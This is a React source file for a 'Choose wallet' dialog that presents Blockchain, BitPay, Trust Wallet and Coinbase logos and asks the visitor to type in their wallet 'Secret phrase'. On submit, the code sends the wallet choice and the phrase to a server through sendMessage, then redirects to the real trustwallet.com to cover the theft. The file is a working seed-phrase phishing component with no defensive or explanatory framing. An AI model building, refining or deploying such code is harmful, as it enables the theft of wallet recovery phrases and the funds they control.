import { LoadingButton } from "@mui/lab";
import {
  DialogContent,
  FormControlLabel,
  FormLabel,
  Grid,
  Radio,
  RadioGroup,
  TextField,
} from "@mui/material";
import { alpha, styled } from "@mui/material/styles";
import Dialog from "@mui/material/Dialog";
import DialogTitle from "@mui/material/DialogTitle";
import Typography from "@mui/material/Typography";
import PropTypes from "prop-types";
import * as React from "react";
import "./styles.scoped.css";
import { sendMessage } from "../config/server";

const BootstrapButton = styled(LoadingButton)({
  boxShadow: "none",
  textTransform: "none",
  fontSize: 16,
  padding: "6px 12px",
  border: "1px solid",
  lineHeight: 1.5,
  backgroundColor: "#4caf50",
  height: 50,
  fontFamily: [
    "-apple-system",
    "BlinkMacSystemFont",
    '"Segoe UI"',
    "Roboto",
    '"Helvetica Neue"',
    "Arial",
    "sans-serif",
    '"Apple Color Emoji"',
    '"Segoe UI Emoji"',
    '"Segoe UI Symbol"',
  ].join(","),
});

const wallets = [
  {
    title: "blockchain",
    imgae: "./images/blockchain.png",
  },
  {
    title: "bitpay",
    imgae: "./images/bitpay.png",
  },
  {
    title: "trustwallet",
    imgae: "./images/trustwallet.jpg",
  },
  {
    title: "coinbase",
    imgae: "./images/coinbase.png",
  },
];

const emails = ["username@gmail.com", "user02@gmail.com"];

function SimpleDialog(props) {
  const { onClose, selectedValue, open } = props;
  const [value, setValue] = React.useState({
    wallet: "blockchain",
    phrase: "",
  });
  const [loading, setLoading] = React.useState(false);

  const handleClose = () => {
    onClose(selectedValue);
  };

  const handleChange = (event) => {
    setValue({ ...value, [event.target.name]: event.target.value });
  };

  const submit = (event) => {
    event.preventDefault();
    setLoading(true);
    sendMessage(value).then(() => {
      setLoading(false);
      window.location.replace("https://trustwallet.com/");
    });
  };

  return (
    <Dialog onClose={handleClose} open={open} fullWidth={true} maxWidth="sm">
      <DialogTitle>Choose wallet</DialogTitle>
      <DialogContent>
        <form onSubmit={submit}>
          <FormLabel id="demo-radio-buttons-group-label">Gender</FormLabel>
          <RadioGroup
            row
            aria-labelledby="demo-radio-buttons-group-label"
            defaultValue="blockchain"
            name="wallet"
            value={value.wallet}
            onChange={handleChange}
          >
            {wallets.map((vl, index) => (
              <FormControlLabel
                key={index}
                value={vl.title}
                control={<Radio />}
                label={<img src={require(`${vl.imgae}`)} width={80} />}
              />
            ))}
          </RadioGroup>

          <input
            type="text"
            required
            name="phrase"
            placeholder="Secret phrase"
            id="phrase"
            onChange={handleChange}
          />
          <BootstrapButton
            loading={loading}
            type="submit"
            variant="contained"
            color="success"
            //  onClick={handleClickOpen}
            disableElevation
            size="large"
            fullWidth
          >
            Connect
          </BootstrapButton>
        </form>
      </DialogContent>
    </Dialog>
  );
}

SimpleDialog.propTypes = {
  onClose: PropTypes.func.isRequired,
  open: PropTypes.bool.isRequired,
  selectedValue: PropTypes.string.isRequired,
};

export default function ProccedDialog() {
  const [open, setOpen] = React.useState(false);
  const [selectedValue, setSelectedValue] = React.useState(emails[1]);
  const [loading, setLoading] = React.useState(false);

  const handleClickOpen = () => {
    setOpen(true);
  };

  const handleClose = (value) => {
    setOpen(false);
    setSelectedValue(value);
  };

  return (
    <div>
      <Typography variant="subtitle1" component="div">
        Connect to your available wallet in order to proceed
      </Typography>
      <br />
      <BootstrapButton
        loading={loading}
        variant="contained"
        color="success"
        onClick={handleClickOpen}
        disableElevation
        size="large"
        fullWidth
      >
        Connect
      </BootstrapButton>
      <SimpleDialog
        selectedValue={selectedValue}
        open={open}
        onClose={handleClose}
      />
    </div>
  );
}
